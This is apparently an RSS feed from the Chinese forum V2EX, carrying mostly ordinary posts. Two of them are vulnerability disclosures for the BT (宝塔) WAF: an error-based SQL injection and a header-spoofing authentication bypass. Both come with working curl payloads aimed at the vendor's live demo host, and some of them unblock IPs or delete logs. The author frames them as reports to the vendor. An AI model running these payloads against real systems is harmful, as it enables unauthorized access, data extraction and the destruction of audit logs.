<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/"><channel><title>V2EX</title><link>https://www.v2ex.com/</link><description>way to explore</description><lastBuildDate>Sat, 17 Feb 2024 01:34:44 GMT</lastBuildDate><generator>rfeed v1.1.1</generator><docs>https://github.com/svpino/rfeed/blob/master/README.md</docs><item><title>[问与答] 有没有人发现春晚刘谦魔术用的是特制的计时器？</title><link>https://www.v2ex.com/t/1015950#reply0</link><description>正常计时器显示的时间都是   h:m:&lt;a href="http://s.ms" rel="nofollow noopener" target="_blank"&gt;s.ms&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;但是刘谦用的计时器显示的时间是 h:m:s:ms&lt;br /&gt;&lt;br /&gt;刘谦的毫秒前面的是:不是.  这应该就是最大的 BUG 了吧，不知道是谁给刘谦写的 APP ，这么低级的错误</description><pubDate>Sat, 17 Feb 2024 01:33:11 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015950#reply0</guid></item><item><title>[问与答] 当下组全 ssd nas 最合适的 ssd 硬盘是什么</title><link>https://www.v2ex.com/t/1015949#reply1</link><description>&lt;p&gt;书接上文： &lt;a href="https://v2ex.com/t/1009959" rel="nofollow"&gt;https://v2ex.com/t/1009959&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;最终还是准备上纯 SSD ，来解决噪音问题。想问一下各位大佬，在考虑寿命、稳定性、价格、容量、读写速度等因素后，当下这个时点（ 2024-02-17 ）最具性价比的 SSD 是什么？&lt;/p&gt;
&lt;p&gt;PS：我看到目前直接搜 SSD ，出来的都是 m.2 接口的。但是按照我的需求应该 SATA 接口的就足够使用了？&lt;/p&gt;</description><pubDate>Sat, 17 Feb 2024 01:20:37 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015949#reply1</guid></item><item><title>[Mastodon] A Love Letter to Fediverse</title><link>https://www.v2ex.com/t/1015948#reply1</link><description>&lt;p&gt;&lt;a href="https://write.c7.io/snullp/a-love-letter-to-fediverse" rel="nofollow"&gt;https://write.c7.io/snullp/a-love-letter-to-fediverse&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在 Sora 刚刚推出的今天，有人认为未来已来，有人认为世界终了。但不论如何，我相信大家都能在 Fediverse 里找到属于自己的空间。&lt;/p&gt;
&lt;h3&gt;一封给 Fediverse 的情书&lt;/h3&gt;
&lt;p&gt;我从一年前创办了自己的长毛象实例 希奇！ 之后，就一直很关注 Fediverse ，中文名“联邦宇宙”的生态。长毛象（ Mastodon ）是运行在 Fediverse 之上的一个微博实例，但我更喜欢经由对于它的使用和管理窥探更加底层的 Fediverse 的原理。一年下来，我对 Fediverse 的信心从未如此强烈。我相信这是互联网的未来。&lt;/p&gt;
&lt;h3&gt;Fediverse 是什么&lt;/h3&gt;
&lt;p&gt;Fediverse 其实是人们对于一个基于 ActivityPub 协议构建的通信网络的昵称。其灵魂，ActivityPub 协议是 W3C 标准化的一种去中心化通信协议。ActivityPub 的核心非常简单，就是在现代密码学技术的基础上建立一个点对点的可信通信。当一个用户第一次出现并广播其存在后，就不可能再有别人再能够使用这个身份，而这一切都不需要一个传统的中心化服务（身份服务器）的存在。&lt;/p&gt;
&lt;p&gt;在这样可信通信的基础上，ActivityPub 规定了一系列的信息（ payload ）格式，从而让用户更加方便地分享文字、媒体以及元数据。那么更进一步，有大量实现了 ActivityPub 的程序可以供大家使用，譬如长毛象（ Mastodon ）、Misskey （类似于 Facebook ）、Pleroma 、Firebird 等等。这些程序帮助用户来管理身份，也就是他们的密码学公私钥，并提供更加友好的用户界面，从而在这个去中心化网络上实现传统互联网产品的用户体验（用户名/密码登录，账号管理，信息导入导出）。Fediverse 就是由这些程序搭建的实例（ instances ）所组成的网络。&lt;/p&gt;
&lt;p&gt;Fediverse （联邦宇宙）这个名字正巧妙在它包含了这种通信方式的两种特性：一方面，毫无疑问这不是一个传统的中心化的网络。这里没有一个中心化的服务器凌驾于所有人之上。另一方面，它又不同于完全 P2P 的通信网络，它并不要求每一个用户以一种原子化的身份管理一切，而是让每一个实例成为网络中的节点。一个实例对于它的用户具有管理的权威，但反过来说由于互联网上实例多如繁星，用户对实例也有自由选择的权力。&lt;/p&gt;
&lt;p&gt;这种介于中心化和完全去中心化之间的方案既对用户提供了轻松容易的体验，也保证了用户的权力不受到实例的侵蚀。&lt;/p&gt;
&lt;h3&gt;Fediverse 像什么&lt;/h3&gt;
&lt;p&gt;说了这么多枯燥的，我觉得还是想象一下它像什么比较有趣：&lt;/p&gt;
&lt;p&gt;ActivityPub 的直译：动感酒吧！&lt;/p&gt;
&lt;p&gt;说真的，我觉得酒吧（或者说酒吧一条街）就是 Fediverse 最完美的类比。具体来说，每一个实例就是一个个酒吧，它们互不隶属，甚至可以说存在竞争关系。不同酒吧有着不同的装修、人群和规章制度，从而吸引着相似的顾客们。但顾客可以自由出入任意酒吧，也自然会选择在喜欢的酒吧多呆一阵子，慢慢地和酒吧的氛围相辅相成，形成一个独特的社群。总的来说，这一切都和现实生活一样自由随意：顾客能够在这条街上接触到所有的信息，遇到各色人群，同时有选择自己最舒服环境的权力。这也是为什么我觉得 Fediverse 会是互联网的未来，它模拟了现实生活中美好的部分。（中心化的互联网模型如果来到现世中，那是多么 1984 的画面呐？）&lt;/p&gt;
&lt;p&gt;而且这样自由的模型并不是空想。实际上，互联网的基石——BGP 协议和 Fediverse 无比相似。在互联网协议（是的，互联网之所以能联通全球，就是因为有一套标准协议）所描绘的画面中，每一个接入网络的实体被称作 AS （自治系统）。AS 通过 BGP 向外部广播它的存在，并指导别的 AS 将目的是自己的信息发送过来。这和上面描述的 Fediverse 简直一模一样有没有？互联网的成功很大部分是因为它不受任何单一实体控制，而终端用户（每一个上网的人）又不用了解所有的技术细节。那同样的道理，Fediverse 怎么会不成为未来的互联网标准呢？&lt;/p&gt;
&lt;h3&gt;Fediverse 缺点又是什么呢&lt;/h3&gt;
&lt;p&gt;正在撰写这篇文章的时候，Fediverse 经历了一场 spam 风暴。而不同实例的应对方式千差万别。有的实例事先就做好了 Anti-spam 的逻辑，完全没有受到任何影响；有的实例站长反应迅速，在 spam 刚刚开始的时候就采取了相应的措施删除了所有无效信息。但也有的实例因为不作为，成为了 spam 发酵的摇篮影响了整个 Fediverse ，最终被别的实例所封杀。&lt;/p&gt;
&lt;p&gt;Fediverse 由于其去中心化的本质，每个最终用户的体验取决于它所在的实例的水平。按常理来说，实例的运营方应当都是懂得“权力越大，责任越大”的道理，选择运营一个实例那就应当付出精力和技术去保证它的正常运作。但事实上任何人都可以很随便地搭建一个实例，而且所用的程序都是开源的在用户看来似乎也没什么区别。因此用户不太可能具有短期内分辨实例质量的能力。在遇到不良管理的实例后会有很糟糕的体验。&lt;/p&gt;
&lt;p&gt;前一阵子长毛象公布了一系列安全补丁，其中之一因为涉及到身份伪造，非常紧急，被官方以不同的渠道提前通知。但直到今天，仍有不少实例没有更新，其中不乏个别大站。这让其用户暴露在了危险之中，但用户可能还并不知情。&lt;/p&gt;
&lt;p&gt;当然，这些问题本质上并不“新”。Spamming ，安全漏洞，都是信息行业的老生常谈了。工业界也都有成熟的解决方案。因此，这些问题其实并不危机 Fediverse 的本质。相反，在经历过重大打击后，我觉得 Fediverse 能以比传统平台更快的速度重新成长恢复。野火烧不尽，春风吹又生。&lt;/p&gt;
&lt;h3&gt;为什么我认为 Fediverse 是未来&lt;/h3&gt;
&lt;p&gt;其实这个问题上面已经回答过了。简言之，它既不受单一实体的控制，又不把最终用户暴露在复杂的技术细节当中。&lt;/p&gt;
&lt;p&gt;我想我们已经不用讨论去中心化之于中心化的优势，twitter 就是个很好的反例。同时，不同于现在已经烂尾的，纯粹去中心化，不存在“实例”概念的 nostr 协议，Fediverse 并不期待每一个用户都是 nerd 和黑客。它通过联邦每一个实例，而不是每一个用户，实现了优秀的用户体验。Fediverse 其实对于我们并不陌生，因为它只是模拟了现实生活中的一个方面而已。&lt;/p&gt;
&lt;p&gt;也许现有的 Fediverse 程序（长毛象，Misskey 等等）仍有很大的进步空间，也许在未来这些程序都会被淘汰。但 Fediverse 不会。我希望大家都通过这篇文章了解到这么一个优美且有未来感的协议，在其中找到属于你自己的一片空间。&lt;/p&gt;
&lt;p&gt;ps. 如果你还没有任何 Fediverse 的经验，欢迎来我的长毛象实例，希奇！来玩。本实例还附带了希奇！博客栈，同样也接入了 Fediverse ，也是本文所在的地方。&lt;/p&gt;</description><pubDate>Sat, 17 Feb 2024 01:11:45 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015948#reply1</guid></item><item><title>[问与答] 时间/工作管理</title><link>https://www.v2ex.com/t/1015947#reply1</link><description>平时工作任务多，杂， 大家一般如何管理和规划？&lt;br /&gt;&lt;br /&gt;按天？按周？&lt;br /&gt;&lt;br /&gt;直接通过待办吗？</description><pubDate>Sat, 17 Feb 2024 01:11:12 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015947#reply1</guid></item><item><title>[问与答] E5 V3/V4 和 eypc 的 7302， 7d12 之类的组建 homelab（主要是多开 VM）哪个性价比更好，功耗，核心性能等综合考虑</title><link>https://www.v2ex.com/t/1015946#reply0</link><description></description><pubDate>Sat, 17 Feb 2024 01:09:41 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015946#reply0</guid></item><item><title>[分享创造] 春节整活小目标： background-erase 使用 RMBG-1.4 强大 AI 模型，免费在线去除背景图片网站</title><link>https://www.v2ex.com/t/1015945#reply0</link><description>&lt;p&gt;刚发现有大佬整了类似的网站，这个模型的效果确实不错，太巧了，我也整了个😂，还是发出来吧。&lt;/p&gt;
&lt;p&gt;这个春节没有回老家过年，正好有充裕的时间来整些事情。&lt;a href="https://background-erase.xyz/" rel="nofollow"&gt;background-erase&lt;/a&gt; 这个网站，纯粹是春节期间在逛推的时候，看到了 RMBG-1.4 这个最新删除图片背景的模型，试用了下效果非常不错，免费而且综合去除背景的效果比现有大部份都要好。就整了这个在线的网站，点击👇这个地址直接传图片体验，特别是对于电商类的图片，效果很可以，人像抠图也不错。&lt;/p&gt;
&lt;p&gt;网站地址： &lt;a href="https://background-erase.xyz/" rel="nofollow"&gt;https://background-erase.xyz/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;开源算法模型地址： &lt;a href="https://huggingface.co/briaai/RMBG-1.4" rel="nofollow"&gt;https://huggingface.co/briaai/RMBG-1.4&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;欢迎大家来使用体验，RMBG-v1.4 模型删除背景的质量还是很能打的，对于电商场景很适用，重点是免费而且完全在用户本地处理，不上传用户任何图片。&lt;/p&gt;
&lt;p&gt;无论你是一名设计师，需要为项目快速去除图片背景，还是一名卖家，希望产品图片更加突出；或者你只是想为个人照片制作一个干净的背景，都是一个不错的选择。&lt;/p&gt;
&lt;p&gt;&lt;img alt="" class="embedded_image" rel="noreferrer" src="https://p.ipic.vip/j5uaag.png" /&gt;&lt;/p&gt;</description><pubDate>Sat, 17 Feb 2024 01:05:51 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015945#reply0</guid></item><item><title>[程序员] https://www.ossking.com 图床新增功能：粘贴上传；可以为组图创建相册了</title><link>https://www.v2ex.com/t/1015944#reply0</link><description>&lt;h2&gt;网址： &lt;a href="https://www.ossking.com" rel="nofollow"&gt;https://www.ossking.com&lt;/a&gt;&lt;/h2&gt;
&lt;h2&gt;版本：v0.3.0&lt;/h2&gt;
&lt;h2&gt;New Features:&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;粘贴上传&lt;/li&gt;
&lt;li&gt;多图同时上传，每次最多 10 张，可以上传多次&lt;/li&gt;
&lt;li&gt;多图上传之后，可以创建相册，生成一个相册地址，打开可以同时看组图&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;roadmap：&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;开通注册登录功能，管理以上传的图片，和已创建的相册&lt;/li&gt;
&lt;li&gt;目前图还是存在 &lt;a href="http://telegra.ph" rel="nofollow"&gt;telegra.ph&lt;/a&gt; ，但是，正在研究 MinIO ，准备自建存储服务器，总之，目标是持续运营 10 年&lt;/li&gt;
&lt;/ul&gt;</description><pubDate>Sat, 17 Feb 2024 00:23:44 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015944#reply0</guid></item><item><title>[宽带症候群] 油管 TV 版无法连接网络，网页版访问正常</title><link>https://www.v2ex.com/t/1015943#reply4</link><description>&lt;p&gt;春节换了个 flowercloud 的梯子，发现油管 tv 版提示无法连接网络，网页版访问正常。
使用方式：openwrt 软路由基本设置
换了其他家的梯子节点，油管 tv 版就可以访问了
感觉是节点问题，有朋友知道原因吗，或者帮忙验证下&lt;/p&gt;</description><pubDate>Sat, 17 Feb 2024 00:18:07 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015943#reply4</guid></item><item><title>[旅行] 3700 字， 80 张图，西藏游记终于写好了！</title><link>https://www.v2ex.com/t/1015942#reply2</link><description>&lt;p&gt;如果你年轻时有幸去过西藏，那么你的余生无论去往哪里，西藏永远会与你在一起。&lt;/p&gt;
&lt;p&gt;3700 个字，80 张图，断断续续写了好久......&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;公众号文章地址： &lt;a href="https://mp.weixin.qq.com/s/8fk4I8JxVHG0vYyJeOXGxg" rel="nofollow"&gt;https://mp.weixin.qq.com/s/8fk4I8JxVHG0vYyJeOXGxg&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;博客链接： &lt;a href="https://blog.sunguoqi.com/posts/2c20bbfc/" rel="nofollow"&gt;https://blog.sunguoqi.com/posts/2c20bbfc/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一些说明：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;建议阅读微信公众号版本，排版会更好。&lt;/li&gt;
&lt;li&gt;文中所有图片，只要是相机拍的，都是直出，无后期。&lt;/li&gt;
&lt;li&gt;网站里的图片画质更高清，喜欢哪张可以自取，无需授权。&lt;/li&gt;
&lt;li&gt;如果能关注一下我的公众号，支持一下，我会非常开心。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;[小孙同学 Coding ]  &lt;a href="http://mp.sunguoqi.com" rel="nofollow"&gt;mp.sunguoqi.com&lt;/a&gt;&lt;/p&gt;</description><pubDate>Sat, 17 Feb 2024 00:13:10 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015942#reply2</guid></item><item><title>[Edge] Edge 浏览器的这个启动问题我该怎么回答？</title><link>https://www.v2ex.com/t/1015941#reply7</link><description>&lt;p&gt;越来越像数字公司靠拢了啊&lt;/p&gt;
&lt;p&gt;想了半天，“保持默认”和“仅设为默认”这种，真的是产品经理费了功夫啊。&lt;/p&gt;
&lt;p&gt;&lt;img alt="edge" class="embedded_image" rel="noreferrer" src="https://ibb.co/100JY1G" /&gt;
&lt;a href="https://ibb.co/100JY1G" rel="nofollow"&gt;https://ibb.co/100JY1G&lt;/a&gt;&lt;/p&gt;</description><pubDate>Sat, 17 Feb 2024 00:03:11 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015941#reply7</guid></item><item><title>[问与答] OwnCloud 的客户端居然不支持同步软链接</title><link>https://www.v2ex.com/t/1015940#reply0</link><description>&lt;p&gt;我有一个大目录需要同步，里面有文件和目录的符号链接，OwnCloud 的客户端居然不支持同步软链接，想了一想，可能有 2 个办法&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;换其他云盘，不知道主流的云盘哪些个支持符号链接的？&lt;/li&gt;
&lt;li&gt;OwnCloud 的客户端是开源的，自己从客户端里找到相关的代码修改，编译之。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;V 友们有更好的建议么？&lt;/p&gt;</description><pubDate>Fri, 16 Feb 2024 23:55:17 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015940#reply0</guid></item><item><title>[问与答] 磨砂透白的 TPU 手机软壳如何清理？</title><link>https://www.v2ex.com/t/1015938#reply1</link><description>我知道这种半透明的手机壳是消耗品，但是很好看啊。&lt;br /&gt;本以为用久后就会发黄，但是 20 块钱买了个用了不到 2 周就发黑是没想到的……&lt;br /&gt;手指经常握持的部位明显有些发黑，很明显很影响颜值。我尝试用牙膏+海绵擦洗，以及用酒精湿巾用力擦都没啥效果。所以有没有办法能清洁一下这种手机壳呢？下一步我打算爆炸盐泡一下后扔洗衣机洗一下试试。</description><pubDate>Fri, 16 Feb 2024 23:14:00 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015938#reply1</guid></item><item><title>[服务器] 我又又发现了宝塔的 SQL 注入漏洞</title><link>https://www.v2ex.com/t/1015934#reply4</link><description>&lt;p&gt;接上篇文章，&lt;a href="https://v2ex.com/t/1015932" rel="nofollow"&gt;在测试宝塔 WAF 的未授权访问漏洞&lt;/a&gt;时无意间还发现了一个 SQL 注入漏洞，品相还不错，可执行任意 SQL 语句。&lt;/p&gt;
&lt;p&gt;总之，吃了一惊，一个防 SQL 注入的工具居然也有 SQL 注入漏洞。&lt;/p&gt;
&lt;p&gt;请看这段代码&lt;/p&gt;
&lt;pre&gt;&lt;code class="language-bash"&gt;get_site_status = function ()
	if not ngx.ctx.get_uri_args.server_name then
		return Public.get_return_state(false, "参数错误")
	end

	... 此处省略若干代码

	slot7, slot8, slot9, slot10 = slot4.query(slot4, [[
SELECT 
		SUM(request) as req,
		SUM(err_40x) as err_40x,
		SUM(err_500) as err_500,
		SUM(err_502) as err_502,
		SUM(err_503) as err_503,
		SUM(err_504) as err_504,
		SUM(err_499) as err_499,
		SUM(send_bytes) as send_bytes,
		SUM(receive_bytes) as recv_bytes,
		SUM(pc_count) as pc_count,
		SUM(mobile_count) as mobile_count,
		SUM(spider_baidu) as spider_baidu,
		SUM(spider_google) as spider_google,
		SUM(spider_bing) as spider_bing,
		SUM(spider_360) as spider_360,
		SUM(spider_sogou) as spider_sogou,
		SUM(spider_other) as spider_other,
		SUM(ip_count) as ip_count,
		SUM(pv_count) as pv_count,
		SUM(uv_count) as uv_count
		 FROM `request_total` WHERE `server_name`=']] .. slot1 .. "' AND `date`='" .. os.date("%Y-%m-%d") .. "'")

	... 此处省略若干代码

	return Public.get_return_state(true, slot6)
end
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这段代码位于 &lt;code&gt;/cloud_waf/nginx/conf.d/waf/public/waf_route.lua&lt;/code&gt;  文件中，源文件是 luajit 编译后的内容，反编译一下即可看到源码&lt;/p&gt;
&lt;p&gt;这段逻辑就在上文提到的 get_site_status API 中，slot1 变量就是 server_name 参数。原理很简单，server_name 参数没有做任何校验就直接带入了 SQL 查询。&lt;/p&gt;
&lt;p&gt;宝塔官网还没有修复这个问题，还是拿宝塔官网为例，试试以下命令：&lt;/p&gt;
&lt;pre&gt;&lt;code class="language-bash"&gt;curl "http://btwaf-demo.bt.cn/get_site_status?server_name='-extractvalue(1,concat(0x5c,database()))-'"  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;响应如下&lt;/p&gt;
&lt;pre&gt;&lt;code class="language-bash"&gt;{"status":false,"msg":"数据查询失败: XPATH syntax error: '\\btwaf': 1105: HY000."}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;从响应来看已经注入成功，通过 updatexml 的报错成功的爆出了库名叫 btwaf&lt;/p&gt;
&lt;p&gt;继续执行以下命令：&lt;/p&gt;
&lt;pre&gt;&lt;code class="language-bash"&gt;curl "http://btwaf-demo.bt.cn/get_site_status?server_name='-extractvalue(1,concat(0x5c,version()))-'"  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;响应如下&lt;/p&gt;
&lt;pre&gt;&lt;code class="language-bash"&gt;{"status":false,"msg":"数据查询失败: XPATH syntax error: '\\8.1.0': 1105: HY000."}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;从响应来看，mysql 版本是 8.1.0&lt;/p&gt;
&lt;p&gt;在继续执行以下命令&lt;/p&gt;
&lt;pre&gt;&lt;code class="language-bash"&gt;curl "http://btwaf-demo.bt.cn/get_site_status?server_name='-extractvalue(1,concat(0x5c,(select'hello,world')))-'"  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;响应如下&lt;/p&gt;
&lt;pre&gt;&lt;code class="language-bash"&gt;{"status":false,"msg":"数据查询失败: XPATH syntax error: '\\hello,world': 1105: HY000."}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;看起来 select 'hello,world' 也执行成功了，到此为止，基本可以执行任意命令。&lt;/p&gt;
&lt;p&gt;漏洞已通报给宝塔官方，此漏洞危害较大，各位宝塔用户请关注宝塔官方补丁，及时更新。&lt;/p&gt;</description><pubDate>Fri, 16 Feb 2024 19:21:19 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015934#reply4</guid></item><item><title>[服务器] 我发现了宝塔的未授权访问漏洞</title><link>https://www.v2ex.com/t/1015932#reply4</link><description>&lt;p&gt;接上篇文章，继过年前发现&lt;a href="https://www.freebuf.com/vuls/390723.html" rel="nofollow"&gt;宝塔 WAF 后台的命令注入漏洞&lt;/a&gt;后，寒假期间闲着无事，过年又不想跑亲戚，又翻了翻宝塔的代码，再一次发现了重大漏洞。&lt;/p&gt;
&lt;p&gt;大过年还在看代码真是不容易，宝塔请给我广告费+代码审计费。&lt;/p&gt;
&lt;p&gt;整个宝塔 WAF 核心防护功能的代码写的确实有点粗糙，代码组织方式不像一个成熟软件该有的架构，小 Bug 一眼望不到头，今天分享的是一个未授权访问漏洞，普通用户可以无视宝塔的随机登录地址，无视宝塔的登录密码，直接操作后台的数据，实现人人都是管理员的效果。&lt;/p&gt;
&lt;p&gt;请看这段代码&lt;/p&gt;
&lt;pre&gt;&lt;code class="language-bash"&gt;start = function ()
	... 此处身略若干行
	if ngx.var.remote_addr == "127.0.0.1" and ngx.ctx.Server_name == "127.0.0.251" and ngx.var.host == "127.0.0.251" then
		if ngx.var.uri == "/get_btwaf_drop_ip" then
			Public.return_message(200, uv0.get_btwaf_drop_ip())
		elseif ngx.var.uri == "/remove_btwaf_drop_ip" then
			Public.return_message(200, uv0.remove_btwaf_drop_ip())
		elseif ngx.var.uri == "/clean_btwaf_drop_ip" then
			Public.return_message(200, uv0.clean_btwaf_drop_ip())
		elseif ngx.var.uri == "/updateinfo" then
			Public.return_message(200, uv0.updateInfo())
		elseif ngx.var.uri == "/get_site_status" then
			Public.return_message(200, uv0.get_site_status())
		elseif ngx.var.uri == "/get_global_status" then
			Public.return_message(200, uv0.get_global_status())
		end

		if ngx.var.uri == "/clean_btwaf_logs" then
			Public.return_message(200, uv0.clean_btwaf_logs())
		end

		if ngx.var.uri == "/clear_speed_hit" then
			Public.return_message(200, uv0.clear_speed_hit())
		end

		if ngx.var.uri == "/clear_replace_hit" then
			Public.return_message(200, uv0.clear_replace_hit())
		end

		if ngx.var.uri == "/reset_customize_cc" then
			Public.return_message(200, uv0.reset_customize_cc())
		end

		if ngx.var.uri == "/clear_speed_countsize" then
			Public.return_message(200, uv0.clear_speed_countsize())
		end
	end
end
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这段代码位于 &lt;code&gt;/cloud_waf/nginx/conf.d/waf/public/waf_route.lua&lt;/code&gt;  文件中，源文件是 luajit 编译后的内容，反编译一下即可看到源码。&lt;/p&gt;
&lt;p&gt;看代码最开端的 if 语句，只要满足 ip 是 127.0.0.1 ，域名是 127.0.0.251 这两个条件就能在不用登录的情况下访问下面的 API 。&lt;/p&gt;
&lt;p&gt;话说这是临时工写的代码吧，对于宝塔的配置来说，要满足这两个条件很难吗？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;配置 x-forwarded-for 头为 127.0.0.1 即可满足 ip 是 127.0.0.1 的条件&lt;/li&gt;
&lt;li&gt;配置 host 头为 127.0.0.251 即可满足域名是 127.0.0.251 的条件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;提供一条 curl 参数供大家参考&lt;/p&gt;
&lt;pre&gt;&lt;code class="language-bash"&gt;curl 'http://宝塔地址/API'  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;到此漏洞原理就讲完了&lt;/p&gt;
&lt;p&gt;我们访问宝塔官方网站做个测试&lt;/p&gt;
&lt;h3&gt;get_btwaf_drop_ip&lt;/h3&gt;
&lt;p&gt;这个 API 用来获取已经拉黑的 IP 列表，使用以下命令发起访问&lt;/p&gt;
&lt;pre&gt;&lt;code class="language-bash"&gt;curl 'http://btwaf-demo.bt.cn/get_btwaf_drop_ip'  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;remove_btwaf_drop_ip&lt;/h3&gt;
&lt;p&gt;这个 API 用来解封 IP ，提供一个 get 参数即可，使用以下命令发起访问&lt;/p&gt;
&lt;pre&gt;&lt;code class="language-bash"&gt;curl 'http://btwaf-demo.bt.cn/remove_btwaf_drop_ip?ip=1.2.3.4'  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;响应如下&lt;/p&gt;
&lt;pre&gt;&lt;code class="language-bash"&gt;{"msg":"1.2.3.4 已解封","status":true}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;clean_btwaf_drop_ip&lt;/h3&gt;
&lt;p&gt;这个 API 用来解封所有 IP ，使用以下命令发起访问&lt;/p&gt;
&lt;pre&gt;&lt;code class="language-bash"&gt;curl 'http://btwaf-demo.bt.cn/clean_btwaf_drop_ip'  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;响应如下&lt;/p&gt;
&lt;pre&gt;&lt;code class="language-bash"&gt;{"msg":"已解封所有 IP","status":true}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;updateinfo&lt;/h3&gt;
&lt;p&gt;这个 API 看起来是更新配置用的，需要一个 types 参数做校验，但实际并没有什么用处，使用以下命令发起访问&lt;/p&gt;
&lt;pre&gt;&lt;code class="language-bash"&gt;curl 'http://btwaf-demo.bt.cn/updateinfo?types'  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;get_site_status&lt;/h3&gt;
&lt;p&gt;这个 API 用来获取网站的配置，server_name 参数需要提供网站的域名，使用以下命令发起访问&lt;/p&gt;
&lt;pre&gt;&lt;code class="language-bash"&gt;curl 'http://btwaf-demo.bt.cn/get_site_status?server_name=bt.cn'  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;响应如下&lt;/p&gt;
&lt;pre&gt;&lt;code class="language-bash"&gt;{"status":true,"msg":{"uv":0,"qps":0,"inland":0,"overseas":0,"today":{"pc_count":0,"mobile_count":0,"req":0,"spider_google":0,"spider_bing":0,"spider_sogou":0,"spider_360":0,"spider_other":0,"err_40x":0,"spider_baidu":0,"recv_bytes":0,"send_bytes":0,"err_500":0,"err_502":0,"err_503":0,"err_504":0,"err_499":0,"uv_count":0,"ip_count":0,"pv_count":0},"send_bytes":0,"proxy_count":0,"err_502":0,"recv_bytes":0,"err_504":0,"err_499":0,"ip":0,"proxy_time":0,"pv":0}}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;clean_btwaf_logs&lt;/h3&gt;
&lt;p&gt;这个 API 用来删除宝塔的所有日志，使用以下命令发起访问&lt;/p&gt;
&lt;pre&gt;&lt;code class="language-bash"&gt;curl "http://btwaf-demo.bt.cn/clean_btwaf_logs"  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;后续还有一些 API 大同小异，不一一列举了&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;get_global_status&lt;/li&gt;
&lt;li&gt;clear_speed_hit&lt;/li&gt;
&lt;li&gt;clear_replace_hit&lt;/li&gt;
&lt;li&gt;reset_customize_cc&lt;/li&gt;
&lt;li&gt;clear_speed_countsize&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;漏洞已通报给宝塔官方，此漏洞危害较大，各位宝塔用户请关注宝塔官方补丁，及时更新。&lt;/p&gt;</description><pubDate>Fri, 16 Feb 2024 18:36:02 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015932#reply4</guid></item><item><title>[Android] Galaxy S24 Ultra 和 HUAWEI Mate 60 该怎么选</title><link>https://www.v2ex.com/t/1015931#reply16</link><description>&lt;p&gt;今天去三星门店销售悄悄说他们不是一个级别，无法放在一起对比。
